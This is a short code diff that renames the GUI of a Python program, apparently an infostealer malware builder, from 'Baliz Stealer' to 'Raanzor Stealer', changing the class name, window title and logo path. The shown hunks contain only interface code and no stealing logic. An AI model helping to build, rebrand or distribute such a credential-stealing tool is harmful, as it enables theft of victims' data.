@@ -26,10 +26,10 @@ ctk.set_default_color_theme("dark-blue")
 
 
 
-class BalizStealer(ctk.CTk):
+class RaanzorStealer(ctk.CTk):
     def __init__(self):
         super().__init__()
-        self.title("Baliz Builder")
+        self.title("Raanzor Builder")
         self.geometry("1100x900")
         self.minsize(900, 800)
         self.configure(bg="#1E1E1E")
@@ -37,7 +37,7 @@ class BalizStealer(ctk.CTk):
         top_frame = ctk.CTkFrame(self, fg_color="#2B2B2B")
         top_frame.pack(fill="x", pady=15, padx=15)
 
-        image_path = "asset/baliz.png"
+        image_path = "asset/raanzor.png"
         pil_image = Image.open(image_path)
         ctki_image = CTkImage(pil_image, size=(120, 120))
         logo_label = ctk.CTkLabel(top_frame, image=ctki_image, text="")
@@ -46,7 +46,7 @@ class BalizStealer(ctk.CTk):
 
         title_label = ctk.CTkLabel(
             top_frame,
-            text="Baliz Stealer",
+            text="Raanzor Stealer",
             font=("Comic Sans MS", 48, "bold"),
             text_color="#E53935",
             anchor="w"
@@ -768,5 +768,5 @@ if __name__ == "__main__":
         messagebox.showinfo("Info", message)
 
 if __name__ == "__main__":
-    app = BalizStealer()
+    app = RaanzorStealer()
     app.mainloop()
